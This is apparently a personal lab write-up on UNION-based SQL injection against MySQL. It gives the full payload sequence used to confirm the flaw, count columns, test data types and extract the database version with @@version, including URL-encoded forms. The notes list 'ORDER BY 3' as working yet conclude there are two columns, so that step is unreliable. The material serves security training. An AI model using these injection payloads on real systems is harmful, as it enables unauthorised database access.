# Lab 8: SQL injection attack, querying the database type and version on MySQL and Microsoft

## Goal: Use UNION-based SQLi to extract database version.

1. Test for SQL Injection
Inject:
```bash
'
```
Error confirms SQLi.

2. Find number of columns
```bash
' ORDER BY 1#     works
' ORDER BY 2#     works
' ORDER BY 3#     works
in url => 'ORDER BY 1%23
```
2 columns

(Note: MySQL allows # to comment out rest of query)

3. Check datatype compatibility
```bash
' UNION SELECT 'a','a'#     (string accepted)
in url => 'UNION SELECT 'a','a'%23
```
Both columns accept string → easy extraction.

4. Extract DB Version
MySQL version function:
```bash
@@version
```

Final Payload
```bash
' UNION SELECT @@version, NULL#
'UNION SELECT @@version,NULL%23
```

Version printed 
